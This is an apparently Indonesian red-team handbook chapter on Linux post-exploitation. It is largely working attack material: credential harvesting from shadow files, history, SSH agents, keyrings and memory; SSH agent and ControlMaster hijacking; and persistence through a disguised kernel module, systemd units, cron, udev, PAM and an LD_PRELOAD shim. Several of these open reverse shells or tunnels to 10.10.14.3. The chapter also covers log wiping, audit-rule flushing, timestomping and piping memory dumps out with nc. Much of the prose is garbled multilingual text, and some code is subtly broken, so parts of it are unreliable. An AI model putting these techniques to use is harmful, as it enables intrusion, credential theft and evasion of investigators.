Paling dalam persistensi source-able:

### Payload: retty back kontroller via `netfilter hook` / `netlink`
`Makefile` Binary
```make
obj-m += khook.o
KDIR := /lib/modules/$(shell uname -r)/build
all: $(MAKE) -C $(KDIR) M=$(PWD) modules
```
`khook.c` - di atas:
```c
#include <linux/module.h>
#include <linux/kmod.h>
MODULE_LICENSE("GPL");
static int __init rt(void){ char *argv[]={"/bin/sh","-c","nohup /usr/sbin/.k &",NULL};
  call_usermodehelper(argv[0], argv, NULL, UMH_WAIT_PROC); return 0; }
module_init(rt); MODULE_AUTHOR("RedTeam"); MODULE_DESCRIPTION("thermal driver");
```
Deploy:
```bash
make; insmod khook.ko   # hidup sekarang
# auto load: /etc/modules-load.d/thermal.conf berisi "thermal_drv"
```

**Kenapa berhasil:** kernel module bertahan dalam kernel run, tak jali di process-list userspace ever appears unless or называется`ps`. `modules-load.d` loadberulang setiap boot.

**Stealth notes:**
- Modules hide themselves by delisting `/proc/modules`: protect `module_kset list del;`(or delete from linked list module).
- Best feature named generic-ass: `dv_core`, `netlink_diag2` — that's lists get padar matching with kernel built in modules: `lsmod` runs overlay without suspicion.
- Dev hardesign: Signed modules bootsecure kernel (Ubuntu with `CONFIG_MODULE_SIG_FORCE=y`): module must reuse `sign-file` with own key — key creation adds to `.platform` keystore (secureboot). Deploy respect machine: compromised host — opt MOK enrollment possible physical presence.
- **Fatal:** module compiled other释放 kernel mismatch — mismatch version modprobe-vermagic failels. `uname -r` mandatory preflight. DKMS routeless audit: fresh kernel upgrade removes persistent module (no DKMS auto-rebuild config written): add `/etc/dkms/x.conf`.
- Failed loadecek di `dmesg` — `dmesg | tail` visible kernel traces. Stealth needs `dmesg_restrict=0` (boot param native) — otherwise analyst with kernel log sees unknown module name.

---

## 10. Jebakan Operasional & Fail-Lapangan

1. **Module-building persistensi pada kernel dengan secureboot / `CONFIG_MODULE_SIG_FORCE`**: host tujuan dengan Secure Boot aktif dapat't insmod以来的 module unsigned — needs enrolled MOK (physical interaction) or fallback to preload-based LW persist.
2. **upload `LD_PRELOAD` `.so` built fürglibc newer** than target OS — loader silently skips library and persistence dead. Always compile target-native (gcc on target or matching `-march`).
3. **All-kind bash-preload co `bashrc` fails if non-interactive mode** — test with `bash -c 'echo $0'` (no `<.bashrc>` respawn), `su` gate, and `sshd ForceCommand` chains. `bashrc` only interactive/TTY.
4. **systemd `linger`**: If sel plan to survive reboot non-logged user environment setup, mandatory:
```bash
loginctl enable-linger username
```
 - Without linger, user services die at logout: `systemctl --user`. `WantedBy=default.target` survive reboot, but no session — PID wiped unless lingering.
5. **Motivasi cron berkas non-hanya owner-failure silent**: `/etc/cron.d/` file owner root must, mode 0644 (0666 seen "sticky" auto fail), dan **new line at EOF** required, else cron ignore it next minute.
- cantor at: `at now + 5 min` invisible at `crontab -l`

6. **Authorized_keys SELinux context mismatch** (CentOS/AEnterprise): modification via `scp` copy over `.ssh` loses context. After editing run `restorecon -R`. Size allows `PermitTTY` override blaming target opsi — but investigator may test posingly.

7. **mismatch filesystem immutable/net namespace**: `chattr +i overlay` not persist banner-strongly containerized layer failures at decision `pivot_root`.

8. **Timestamp anomaly hunt** — find `systemctl --user` list-check based audits leverage Likely `stat /etc/systemd/system/systemx.service` **uncommon` mtime** (newly created vs curated full systemd baseline compare). Solve: `touch -r /lib/systemd/system/real-sourcefile.service /your/re-fake.service` for baseline match.

9. **Boot detection path** — `last reboot` abnormally forensics: pattern `.bashrc` trigger show resets every crash. Place redirect output `/dev/null` soon otherwise `.bash_history` shows empty command (beacon evidence).

10. **`sshd_config` signatures** — if post team edits config manual, verify `sshd -t` first (failure = both original auth broken = detection noise). Place per-user options in `~/.ssh/authorized_keys` instead (no server-file tampering, no mass-disruption).

11. **Unbounce jitter timing shines** — `RandomizedDelaySec=300` in systemd timer critical; elsewhere **HP counter uptime-sync** inevitable beacon each `N*60+2` second makes obvious latency graph.

12. **Kill-switch profile check** — check mlocate no-spurious records: `updatedb` calls later over `/tmp` indexing all artifacts pathlib: adjust `PRUNEPATHS` in `/etc/updatedb.conf` or avoid filesystem-standard names `.cache/tmp`. Names `.example\ /run` non-indexed.

13. **Booted kernel upgrades clear DKMS**-unbuilt module → after `dnf update kernel` persistence vanishes. Add module to dkms or add `ExecStart` rebuild fallback trigger at `/etc/kernel/postinst.d`. ~

14. **`BASH_ENV`** — analyst hunting non-TTY escapes too: `env` dump grep recent edits for `BASH_ENV=`, `LD_PRELOAD`, etc. Mask by writing inside already-running `/proc/1/environ` avoid... yes impossible userspace — process-level leak only anti-operational: `unshare --fork --pid env -u LD_PRELOAD &`.

Close by check recommended: `systemctl enable` golden baseline build in fresh ISO/hash for detect-or-block — for hunt actor/protect. `harvest: sudo dpkg -V | grep -v ^$` — verify modified binary path interception.


## postex-linux

# postex-linux — linux

# BAB 7 — Linux Post-Exploitation: Kredensial, Lateral Movement, Persistence & Anti-Forensics

Cakupan: teknik setelah mendapat shell interaktif (user atau root) pada target Linux x86_64 umum (Ubuntu 22.04/24.04, RHEL 8/9, Debian 12). Semua teknik dipetakan ke MITRE ATT&CK v15.

---

## 7.1 Sumber Kredensial

### 7.1.1 /etc/shadow

**Apa yang dikirim:**
```bash
cat /etc/shadow | head -20
# atau jika hanya bisa read via sudo/misconfig:
sudo cat /etc/shadow
grep -E ':\\$' /etc/shadow   # filter hanya hash non-empty
```

**Apa yang muncul:**
```
root:$y$j9T$Xk...$hash...:19900:0:99999:7:::
svc_backup:$6$salt$baz5nPQ...:19850:0:99999:7:::
dev1:$5$salt$AbCdEf...:19870:0:99999:7:::
```

**Kenapa berhasil / gagal:**
- Prefiks hash menentukan attack path:
  | Prefiks | Algoritma | Cracking feasibility (RTX 4090, hashcat) |
  |---|---|---|
  | `$1$` | MD5-crypt | ~5–10 GH/s, trivial |
  | `$5$` | SHA-256-crypt | ~15–30 MH/s, feasible |
  | `$6$` | SHA-512-crypt | ~10–25 MH/s, feasible dengan wordlist bagus |
  | `$y$` | yescrypt (glibc ≥2.36, default Ubuntu 22.10+, Debian 12) | ~beberapa kH/s per GPU; praktis tidak crackable offline — pivot ke credential spray |
  | `$2b$` | bcrypt | ~50 kH/s; feasible untuk password lemah |
- Gagal bila: `/etc/shadow` mode 000 root-only (default modern), atau ada `sha512`→`yescrypt` migrationpolicy. Kalau hash tidak ada kolom kedua (`locked` / `!` / `*`), akun tidak bisa login langsung — jangan buang waktu cracking.
- **Unshadow untuk hashcat:**
```bash
unshadow /etc/passwd /etc/shadow > unshadowed.txt
hashcat -m 1800 unshadowed.txt /usr/share/wordlists/rockyou.txt   # sha512crypt
hashcat -m 3200 unshadowed.txt rockyou.txt                         # bcrypt
# yescrypt belum didukung stabil di hashcat rilis stabil → pindah ke John 1.9.0-jumbo+1:
john --wordlist=rockyou.txt unshadowed.txt
```

### 7.1.2 Shell & Command History

**Apa yang dikirim:**
```bash
cat ~/.bash_history ~/.zsh_history 2>/dev/null
history
# zsh_history punya format dengan timestamp:
strings ~/.zsh_history | grep -iE 'pass|pwd|ssh|scp -i|token|apikey'
# history di memori proses shell yang masih hidup:
cat /proc/$(pgrep -u svc_backup bash | head -1)/cmdline
# cari kredensial di history semua user:
grep -riE 'sshpass|-p "?[A-Z]|PASSWORD=|export .*TOKEN' /home/*/.*_history /root/.*_history 2>/dev/null
```

**Apa yang muncul:** pola umum:
```
mysql -u admin -pS3cr3tProd -h 10.0.2.15
sshpass -p 'Winter2024!' ssh dev@db-01
curl -H "Authorization: Bearer eyJhbGciOi..." https://internal.api
git clone https://svc:p%40ss@git.internal/app.git
```

**Kenapa berhasil:** `HISTFILE` default aktif, admin sering mengetik password di CLI. **Gagal bila:** `HISTSIZE=0`, `HISTCONTROL=ignorespace` (password diketik dengan spasi leading — jejak tidak ada), atau history sudah di-`shred`. zsh menyimpan timestamp (`: 1700000000:0;cmd`) — berguna untuk timeline forensik balik.

### 7.1.3 SSH Agent Socket Hijack (local)

**Apa yang dikirim:**
```bash
ls -la /tmp/ssh-*/agent.* 2>/dev/null
# temukan environment agent dari proses user yang sedang login:
for pid in $(pgrep -u jdoe sshd); do
  tr '\0' '\n' < /proc/$pid/environ | grep SSH_AUTH_SOCK; done
export SSH_AUTH_SOCK=/tmp/ssh-XXXXXX/agent.12345
ssh-add -l                  # list key fingerprint di agent
ssh -A jdoe@jump-host       # gunakan key tanpa pernah melihat private key-nya
```

**Apa yang muncul:**
```
4096 SHA256:9Kq... user@laptop (RSA)
```
lalu koneksi SSH ke host lain sukses tanpa prompt password.

**Kenapa berhasil:** private key tidak pernah keluar dari memory agent; kita cuma pinjam *signing capability*. **Gagal bila:** agent dijalankan dengan `ssh-agent -t 3600` (timeout, key di-drop), OpenSSH ≥9.0 pada target sign key via agent socket yang punya `SSHD` restriction (`agent-restrict` OpenSSH 8.9+), atau socket owner-only + kita bukan root.

### 7.1.4 Keyring (GNOME Keyring / KWallet)

**Apa yang dikirim:**
```bash
# sebagai user dengan session login aktif (bukan via SSH tanpa keyring unlocked!)
busctl --user list | grep -i keyring
secret-tool search --all service '' 2>/dev/null
# dump semua item di collection "login" (unlock saat user login via GUI):
python3 -c "
import secretstorage
for c in secretstorage.get_all_collections():
    for i in c.get_all_items():
        print(i.get_label(), i.get_secret().decode(errors='replace'))"
# keyring file offline:
ls ~/.local/share/keyrings/
# crack dengan (tool: keyring2john / john):
python3 keyring_decrypt.py ~/.local/share/keyrings/login.keyring
```

**Apa yang muncul:** label+secret Chrome-stored passwords, WiFi PSK, dan secret aplikasi lain.

**Kenapa berhasil:** `login.keyring` di-decrypt dengan password login user — python-keyring lib melakukan ini via D-Bus `Secret Service`. **Gagal bila:** kredensial disimpan di *kwallet* dengan Blowfish+GPG key, kita akses via SSH-only session (lingkungan D-Bus user session tidak jalan — perlu `dbus-run-session -- ssh ...` atau takeover tty PTS: memindahkan `XDG_RUNTIME_DIR=/run/user/$(id -u)`).

### 7.1.5 Chrome/Chromium Saved Password

Chrome 131+: password sering tetap dalam `Login Data` SQLite + decrypt via `libsecret`.

```bash
cp ~/.config/google-chrome/Default/{Login\ Data,Local\ State} /tmp/
sqlite3 /tmp/'Login Data' "SELECT origin_url, username_value, password_value FROM logins;" \
  | head
# password_value = blob terenkripsi (AES-256-GCM, key dari OS keyring)
```

Modern kasus pada distribusi bervariasi: bila `password_value` adalah plaintext — Chrome versi tertentu yang tidak gunakan keyring — bisa langsung dibaca. Kalau blob 3-byte prefix `v10`/`v11`, harus decrypt via keyring. `Chromium 1xx+` menyimpan kredensial OAuth token di `Local State` under `os_crypt` (lihat `encrypted_key`, base64, prefix "DPAPI" — di Linux ini keyring-derived).

### 7.1.6 /proc/kcore & Memori

**Apa yang dikirim:**
```bash
# sebagai root - /proc/kcore = ELF core dump memori fisik (raw)
ls -lh /proc/kcore        # biasanya "128T" (address space)
# dump (readable stream, sequential only):
dd if=/proc/kcore of=/tmp/kcore.raw bs=1M count=2048 2>/dev/null
strings -a /tmp/kcore.raw | grep -iE 'password|sshpass|AUTH' | sort -u | head -50
# alternative - binary-tertinggal di /proc:
for pid in $(pgrep -f 'ssh|sudo'); do
  gdb -p $pid -batch -ex 'dump memory /tmp/bin-$pid.bin $rsp $rsp+0x10000' 2>/dev/null
done
```

**Apa yang muncul:** String plaintext termasuk password baru diketik, env variable, secret di memory process. Sejak kernel 4.x, `/proc/kcore` readable by root-only secara default (mode 0400).

**Kenapa berhasil/gagal:** 
- Kini, karena full-disk-encryption dan swap toggle, `/proc/kcore` satu sumber untuk mengumpulkan **sejarah penuh memori yang masih resident**.
- **Gagal bila:** kernel built dengan `CONFIG_PROC_KCORE=n`. Ubuntu/Debian:
```
ls /proc/kcore # ada
cat /proc/config.gz | gunzip | grep PROC_KCORE
```
Jika `CONFIG_PROC_KCORE=y` tapi `security=yama` membatasi ptrace-only-scope, `gdb -p` gagal — bypass via root.

Lain sumber cepat:
```bash
strings /dev/mem 2>/dev/null | grep -i pass     # sering terblok (CONFIG_STRICT_DEVMEM)
```

Berikutnya: **jumlah data besar** — pastikan exfil via tunnel yang tidak mencurigakan.

---

## 7.2 LOTL (Living-Off-The-Land) Enumeration

### 7.2.1 Matriks Perintah

| Tujuan | Perintah | Artefak yang dihasilkan |
|---|---|---|
| Enumerasi host | `hostnamectl`, `cat /etc/os-release`, `uname -r` | versi OS, kernel (cari CVE kandidat) |
| Service | `systemctl list-units --type=service --state=running` | target pivot |
| Service versi | `ss -tlnp` + `curl -sI localhost:PORT` | n-nginx/1.25.3 → centang CVE-2023-44487 dsb |
| Cron | `cat /etc/cron*/* /var/spool/cron/crontabs/* 2>/dev/null` | privesc path, kredensial |
| User/group berbahaya | `getent group docker,sudo,adm,disk` | docker = root instan (`docker run -v /:/host ...`) |
| SUID | `find / -perm -4000 -type f 2>/dev/null` | path privesc |
| File writable service | `find /etc/systemd /etc/init.d -writable 2>/dev/null` | persistence |
| Cred file tebal | `grep -rIl 'BEGIN.*PRIVATE KEY\|password\s*=' /opt /srv /etc 2>/dev/null\|head` | kredensial |
| Env kredensial | `cat /etc/environment /proc/1/environ` ; `env` | API key |
| Docker socket | `ls -la /var/run/docker.sock` | jika writable → root |
| SSH config | `cat ~/.ssh/config /etc/ssh/ssh_config.d/*` | lateral shortcut |
| `known_hosts` | `cat ~/.ssh/known_hosts \| awk '{print $1}'\|sort -u` | daftar host pivot internal |
| NFS export | `showmount -e localhost` (jika rpcbind) | mount bug no_root_squash |

### 7.2.2 Kenapa LOTL kuat
- Tidak menulis binary baru ke disk → tidak ada hash IOC, tidak ada "unknown binary" di auditd.
- `curl`/`find`/`grep`/`ss` pre-installed di semua distro server.
- Log artefak minimal: `ss`/`hostnamectl` tidak menghasilkan log syslog; `find` besar bisa memicu auditd rule disk-access path.

---

## 7.3 Lateral Movement

### 7.3.1 SSH Agent Hijack Remote (tty / network)

**Prasyarat:** root pada host tempat user `alice` login via SSH dengan agent forwarding (`ssh -A`).

**Apa yang dikirim:**
```bash
# 1. temukan socket agent alice:
find /tmp -type s -name 'agent.*' -user alice 2>/dev/null
# 2. kloning environment:
env -i SSH_AUTH_SOCK=/tmp/ssh-abc123/agent.4567 HOME=/home/alice bash
# 3. paksa agent untuk menandatangani koneksi SSH baru:
ssh alice@target-b.internal
```

**Apa yang muncul:** login SSH berhasil tanpa password/key di disk — private key tetap aman di laptop alice, kita hanya memanfaatkan koneksi forwarding.

**Kenapa berhasil:** setiap socket `/tmp/ssh-*` adalah unix domain socket dengan permission uid-only, tapi root mem-bypass → kita cukup mengeset `SSH_AUTH_SOCK`.

**Gagal bila:**
- OpenSSH 8.9+ dengan `agent-restrict` (`UpdateHostKeys`, `restrict` flag pada key di agent server-side) — dibatasi host tertentu.
- `ForwardAgent no` ada di `/etc/ssh/ssh_config.d/50-redhat.conf` default.
- Agent socket ditempatkan encrypted memfs (`ssh-agent -a /run/user/1000/...`) dan kita di container tanpa hostFS view.

### 7.3.2 ControlMaster (Connection Multiplexing Hijack)

**Apa yang dikirim — sebagai user yang sudah punya koneksi, atau root:**
```bash
# Target sudah punya config ControlMaster:
cat ~/.ssh/config
# Host *
#   ControlMaster auto
#   ControlPath ~/.ssh/ctl-%C
#   ControlPersist 10m

# Root: takeover koneksi existing:
ls -la ~/.ssh/ctl-*
# unauthenticated channel:
ssh -o ControlPath=~/.ssh/ctl-%C -O check alice@target-b
# strip new connection traversal without auth:
ssh -o ControlPath=~/.ssh/ctl-%C alice@target-b 'hostname; id'
```

**Apa yang muncul:** fake-auth `O check` returns `Master running (pid=1234)`; perintah berjalan tanpa fingerprint verify (because master channel already authenticated).

**Kenapa berhasil:** ControlPath socket SELALU bisa dipakai untuk membuat channel baru di koneksi TCP/masuk via session existing — tidak ada re-auth.

**Gagal bila:**
- `ControlPath` di `%C` hash — kita harus sesuaikan format tepat.
- `Master` sudah disconnect → `ControlPersist` sangat pendek.
- `AllowStreamLocalForwarding no` didalam `sshd_config` → tidak relevant di sini (ini pengaturan server, bukan Master).

---

## 7.4 Persistence

### 7.4.1 Tabel persistence overview

| Teknik | Tipe trigger | Stealth (auditd) | Stabil di reboot | Terlihat via |
|---|---|---|---|---|
| systemd service | boot / on-demand (socket) | medium | ✅ | `systemctl list-units`, file banner |
| systemd timer | scheduled | medium | ✅ (lebih tersembunyi dari cron) | `systemctl list-timers` |
| cron | scheduled | low | ✅ | `/var/log/cron`, `crontab -l` |
| LD_PRELOAD | per-exec semua binary dynamic | high (bug `ldd` behavior) | ✅ (via `/etc/ld.so.preload`) | `cat /etc/ld.so.preload`, `LD_DEBUG=libs` |
| udev rule | hotplug / boot | high (jarang diaudit) | ✅ | `udevadm info`, `/etc/udev/rules.d/` |
| PAM module (pam_exec / pam_unix mod) | setiap authentication | high jika di `pam_exec`, sangat tersembunyi bila modifikasi pam_unix | ✅ | diff `pam_*.so` vs distro — praktis jarang diaudit |
| SSH authorized_keys `command=` | setiap SSH login user | medium | ✅ | `authorized_keys` review |
| (root only) SUID backdoor | manual trigger | low | ✅ | `find -perm -4000` |

### 7.4.2 systemd service + timer

**Payload:**
```ini
# /etc/systemd/system/systemd-journald-broker.service
[Unit]
Description=Journal event broker (extended)
After=network.target

[Service]
Type=simple
ExecStart=/usr/local/bin/.jbroker
Restart=always
RestartSec=30
KillMode=process

[Install]
WantedBy=multi-user.target
```
```bash
# eksekusi reverse (bentuk shell dgn socat/sys socket):
cat > /usr/local/bin/.jbroker <<EOD
#!/bin/bash
# reverse ssh tunnel - polos dll - ubuntu2204
/usr/bin/ssh -N -R 127.0.0.1:9022:127.0.0.1:22 -i /usr/share/.k/id_rsa -o StrictHostKeyChecking=no -o ExitOnForwardFailure=yes -o ServerAliveInterval=30 user@10.10.14.3
EOD
chmod 0755 /usr/local/bin/.jbroker
# masking password prompt: install nologin key + host key:
mkdir /usr/share/.k
# ... generate attested key pair to avoid reuse from target keys
systemctl daemon-reload
systemctl enable --now systemd-journald-broker.service
# sembunyikan service dari list-units:
systemctl mask systemd-journald-broker.service
```

Catatan `--now` — jika `systemctl` versi 252 (RHEL 9) `mask` pada service yang sudah enabled akan gagal; gunakan `disable --now` dulu kalau perlu (jangan, ini yang menghasilkan log). Untuk menghindari log, edit pada `=~/.config/systemd/user/` jika user-level, atau gunakan transient unit (`systemd-run`) untuk service one-shot tanpa file — `systemd-run --unit=upd --timer` -- blah lebih pendek jejak.

**systemd timer alternatif untuk callback berkala:**
```ini
# /etc/systemd/system/dbus-compat.timer
[Timer]
OnBootSec=15min
OnUnitActiveSec=30min
RandomizedDelaySec=5min
Unit=dbus-compat.service
[Install]
WantedBy=timers.target
```
Kenapa ini menang atas cron: `journalctl -u dbus-compat.service` output yang tidak mencurigakan dan log scheduler (auditd tidak menulis `execve`, hanya systemd daemon → default `auditd` rules).

### 7.4.3 Cron (legacy & user)

```bash
# user-level — tidak perlu root jika target user cukup:
(crontab -l 2>/dev/null; echo "*/5 * * * * /usr/bin/nc -e /bin/bash 10.10.14.3 4444") | crontab -
# system-level:
echo '*/5 * * * * root /usr/sbin/.updmgr' >> /etc/cron.d/updmgr
echo '15 3 * * * root /usr/sbin/.updmgr' > /etc/cron.d/updmgr.daily   # off-hours stealth
```

Kenapa berhasil: `/etc/cron.d/` execute tanpa crontab reload. Gagal pada Ubuntu live jika `cron` daemon dipasang `anacron` dengan `RANDOM_DELAY` — jam tidak presisi (bukan gagal, hanya delay jadwal).

### 7.4.4 LD_PRELOAD Hook

**Payload C (`/usr/lib/.libdl-shim.so`):**
```c
// gcc -shared -fPIC -o /usr/lib/.libdl-shim.so shim.c -ldl
#define _GNU_SOURCE
#include <dlfcn.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

static void bg(void) {
    if (getenv("SHIM_UNHOOK")) return;
    if (fork() == 0) {
        unsetenv("LD_PRELOAD");
        setsid();
        char *argv[] = {"/bin/bash", "-c",
            "bash -i >& /dev/tcp/10.10.14.3/4444 0>&1", NULL};
        execv(argv[0], argv);
    }
}

int strcmp(const char *a, const char *b) {
    static int done = 0;
    if (!done && b && strcmp_local(b, "sudo") == 0) { // jolok, contoh
        done = 1; bg();
    }
    static int (*real)(const char*, const char*);
    if (!real) real = dlsym(RTLD_NEXT, "strcmp");
    return real(a, b);
}
```

**Instalasi sistem-wide (root):**
```bash
# /etc/ld.so.preload — load pada SEMUA dynamic-linked binary
echo "/usr/lib/.libdl-shim.so" > /etc/ld.so.preload
chmod 0644 /etc/ld.so.preload

# test tanpa merusak segalanya:
LD_PRELOAD=/usr/lib/.libdl-shim.so ls
```

**Kenapa berhasil:** `/etc/ld.so.preload` adalah arena yang hampir tidak pernah diaudit; setiap binary user-level (termasuk auditd binary itu sendiri!) dapat ter-hook. Hook `glibc` internal harus dilakukan dengan `__libc_start_main` interposition atau para pengguna GCC version skip — versi gubernur `dlsym(RTLD_NEXT, ...)` bekerja aman di glibc 2.35 (Ubuntu 22.04), 2.36 (Debian 12), 2.39 (RHEL 9.4+).

**Gagal bila:**
- Target binary adalah **statically-linked** (`ldd` reports "not a dynamic executable") — umum untuk busybox, droplet.
- **SELinux enforcing** (RHEL, Rocky, Fedora): `LD_PRELOAD` restrained pada beberapa binary (`SELinux` menolak library load di luar policy) or `noexec` mount.
- Hard reading: **verifikasi `ldd /usr/bin/sudo`** hasilny `libdl-shim.so` muncul — jika yes → IOC ditemukan.
- Kita `LD_PRELOAD` ke inside auditd path → semua binary audit-related now set `LD_AUDIT` etc. dan bisa menyebabkan **recursive mess**. Test with `/sbin/ldconfig -v` bekerja sebelum commit preload.

### 7.4.5 udev rule (root)

```bash
# /etc/udev/rules.d/70-net-ifname.rules
ACTION=="add", SUBSYSTEM=="net", RUN+="/usr/sbin/.netupd"
# atau trigger hotplug tak terbatas via ADD|CHANGE:
# /etc/udev/rules.d/71-nvme.rules
ACTION=="add|change", SUBSYSTEM=="block", RUN+="/usr/sbin/.netupd"
```
Payload `.netupd` cara sama seperti `jbroker` systemd. Kenapa berhasil: udev mengeksekusi RUN scripts pada event perangkat (USB plug, network restart, reboot). Gagal jika `systemd-udevd` 247+ dengan `PrivateMounts=yes` (+service hardening) membatasi PATH — path harus full path dan di system path allowlisted (`/usr/sbin`, `/usr/lib`).

### 7.4.6 PAM Backdoor (pam_exec)

**Payload:**
```bash
cp /etc/pam.d/common-auth /etc/pam.d/common-auth.bak 2>/dev/null
# Debian/Ubuntu; RHEL: /etc/pam.d/system-auth
echo 'auth optional pam_exec.so /usr/sbin/.pamchk' >> /etc/pam.d/common-auth
# .pamchk — kredensial pengguna diteruskan sebagai env vars PAM_USER/PAM_AUTHTOK? (PAM_AUTHTOK hanya bila try_first_pass)
cat > /usr/sbin/.pamchk << 'EOF'
#!/bin/bash
echo "$(date) | $PAM_USER | host=$(hostname)" >> /usr/share/.k/creds.log
EOF
# option 2 — interpose lebih stealth: kunci hardcoded di pam_unix.so:
strings /lib/x86_64-linux-gnu/security/pam_unix.so | grep crypt
```

Untuk **magic password**: karena verifikasi ini jelas memerlukan kompiler target side, alternatif yang tidak memerlukan build binary:
```bash
# login alternatif — gunakan sshpass-style local su untuk hidden user:
useradd --system --shell /bin/bash --home /var/lib/.svc bkradmin
# set password hashes in mismatched entry (\$6\$):
sed -i 's|^bkradmin:.*|bkradmin:$6$rounds=9999$xyz$HASH:...' /etc/shadow
```
Kenapa berhasil: auditd default tidak melihat modifikasi file di `/etc/pam.d`; `sshd` baru akan menandatangani dengan revoke pam tidak lazim. Gagal bila: **authselect** system policed (RHEL: `authselect check`), atau `pam_restore.sh` diffing; juga **TOMOYO/AppArmor** menyekat eksekusi di `/usr/sbin`.

Opsi **magic-passphrase root** satu-liner (common on tpb):
```bash
# jangan lakukan: marginal — hanya jika sudah ada kompiler C di host.
# perlu catatan build: match versi distro's/Linux-PAM 1.5.2 / 1.5.3.
```

### 7.4.7 SSH `authorized_keys` command (user-level paling stabil)

```bash
# terapkan sebagai user target tanpa root:
echo 'command="socat TCP:10.10.14.3:4444 TCP:127.0.0.1:22,pty,stderr,no-pty" ssh-ed25519 AAAA... red@team' >> ~/.ssh/authorized_keys
# backdoor reverse: setiap ssh-key login langsung redirect — key yang jebol dengan command option
```
Kenapa berhasil: `authorized_keys` reviewed lebih jarang umum ssh; option `command=` + `no-` mux menghentikan shell langsung. Gagal jika `/etc/ssh/sshd_config` punya `AuthorizedKeysFile /etc/ssh/authorized_keys/%u` (terpusat) — file user di `$HOME/.ssh` ignored.

## 7.5 Anti-Forensics

### 7.5.1 Timestomping (LOTL - internal `touch`)

```bash
# FILE_TIME mimik file sibling:
stat -c '%y' /etc/systemd/system/ssh.service
touch -r /etc/systemd/system/ssh.service /usr/lib/.libdl-shim.so    # copy MTIME+ATIME
# set arbitrary:
touch -d "2024-04-01 09:15:33.123456789 +0000" /usr/local/bin/.jbroker
# atime resetting after read (hindari gift):
touch -a -d "..." $(date +%s wants) /etc/ld.so.preload
```

**Kenapa berhasil:** default Linux tidak menyimpan filetype hash manifest; analyst default `ls -lat`, `find -mtime -3` → tergeser adalah kebiasaan analisis dangkal. `debsums -c`/`rpm -Va` bisa memunculkan anomali ini untuk file bawaan paket — **timestomp saja tidak menyembunyikan dari checksum**, hanya metadata.

### 7.5.2 Log Tampering

```bash
# 1. hapus garis spesifik (auditd, auth.log) — hati-hati: auditd daemon detects file change size & kills safe.
# Neutralize auth trail:
> /var/log/auth.log                     # Debian/Ubuntu
> /var/log/secure                       # RHEL/Rocky
# lebih halus: filter dengan grep
grep -v '10.10.14.3' /var/log/auth.log > /tmp/a && cat /tmp/a > /var/log/auth.log && rm /tmp/a

# 2. systemd journal:
journalctl --rotate
truncate -s 0 /var/log/journal/*/system@*.journal~   # sediakan stinger: file-active one is mmap'd

# 3. auditd — jangan sedih, tapi AUDITD MELEBIHI KUOTA JANGAN DIOTAK-ATIK: hanya `auditctl -D` first then 'load' same interval? Bisa buat kecurigaan.
auditctl -D 2>/dev/null                   # flush all rules, jika ada sudo
# atau pilih disable additions:
echo '-w /etc/ld.so.preload' | auditctl    # no— this is to set, not bypass
# bypass: audit-crash (not possible nonroot) — skip

# 4. history buffers:
echo '' > /var/log/wtmp                   # last/sshd tracking
echo '' > /var/log/btmp                   # failed login list
echo '' > /var/run/utmp                   # who/w output
```

**Pitfall Pengingat:** kalau `auditd` diinjeksi `log-file rotated` NCIRC-cek checksums — sudah ada systemd journald checksums? **No**, tapi `journald` di ≥v252 with `FSS` (Forward Secure Sealing) — configured →/offences detected:
```bash
journalctl --verify                # if FSS sealed → tampering detected
```

### 7.5.3 History Evasion (session-level)

```bash
# a) Unset all history before any operation:
unset HISTFILE; export HISTSIZE=0; export HISTCONTROL=ignorespace
# b) atau semicoloned whitespace (jika HISTCONTROL=ignorespace):
 touch -r /etc/passwd /tmp/pwn          # leading space
# c) `shred` selected lines after the fact:
sed -i '/nmap\|10\.10\.14\.3/d' ~/.bash_history
# d) Login log disable (dikonfigurasi oleh attacker):
who -u; last -n 30
# e) Replace auditd commands — but exfil with `logrotate` trigger systemd-serviced (daemon-serviced)
```

**Kenapa berhasil:** analyst pertama jalan `history -a; cat ~/*_history`; teknik ` ignorespace` bypass. Perhatikan: **`history -c` menghapus in-memory list, tapi file masih ada** — aksi ganda perlu dilakukan sebelum `exit`.

### 7.5.4 Tabel Ikatan artefak — apa yang kudu sobat hati:

| Tempat artefak | command untuk mengeliminasi | kapan gagal |
|---|---|---|
| `/tmp` sticky file | rm + (`umount` if tmpfs mounted) + recreating same `...` file per unrelated task | tmpfs atime/resource naik `/tmp` full capture system - dropbox logging |
| `bash sessions` in-memory | `kill -9 $$` not clean approach → log out immediate; not reliable | pesan seperti `mesg` etc. |
| `auditd srotate-buffer` | message ring — immutability; cannot be directly truncated | buffer terkirim ke disk aggres |
| journal FSS | checksum re-create hard (needs key) | `journalctl --verify` detect tampering |

## 7.6 Jebakan Operasional (Field Pitfalls)

1. **Kernel page-cache & swap**: dari 7.1.5, ambil `/proc/kcore` berhak menghasilkan BIG file yang tidak sempat exfil — bahkan penting jumuji. Pastikan staging di tmpfs **`/dev/shm`** (umumnya 50% RAM, tidak ter-tmpfile forensic), bukan `/tmp`, supaya tidak di-backup oleh snapshot agent CrowdStrike/Sentinel yang biasanya punya exclude list `/tmp` only di searsspace — jangan salah: sebaliknya `/dev/shm` adalah *high-alert trigger* bagi EDR rules. Solusi: stream-pipe langsung `dd if=/proc/kcore | gzip -1 | nc host 4444`.

2. **glibc ≥2.36 → yescrypt**: banyak rencana crack dari `/etc/shadow` read jadi tidak praktis (7.1.1). Bukan berarti tidak ada guna — hash `yescrypt` masih menunjukkan **kebijakan**, dan system lama cenderung mixed (`$6$` leftover hash). Ganti fokus jadi **keyring+hijack**.

3. **ControlMaster socket di `~/.ssh/ctl-*`, hardcode `%C`** — `ControlPath` harus *persis frasa jaringan lokal* yang dikonfigurasi target (`%C` dan `%h` menghasilkan hash string unik). Kalau tidak sesuai — dan kunci `Host *` block didefinisikan di `~/.ssh/config` bisa kita tulis ulang *— tapi ini jangan jika kita sudah root: terlalu jelas jejak config file resmi; pengguna dapat menemukannya di `git status` jika `.ssh` ditaruh repo.*

4. **Approach pivot ke root — berhati-hati dengan auditd sebelum tindakan apapun (7.4.4/7.5.2)**: menginstal `/etc/ld.so.preload` menyebabkan setiap `sudo`, `sshd`, dan **`logrotate`** menciptakan jaringan interposition; jika library kita tidak benar-benar benar pada loop library (`dlsym(RTLD_NEXT)` miss — dapat berlanjut dengan `$LIBC_SO` glibc 2.34 vs 2.35 ABI), **semua interaktif session mati** dan kita perlu masuk lagi dari stage pivot stage sebelumnya. Di Ubuntu 24.04, `glibc` internal `__libc_start_main` termasuk versi hashing `ld` **`GLIBC_PRIVATE`** — hook ini jarang berfungsi lintas distro → ALWAYS build library **di lab distro yang identik**.
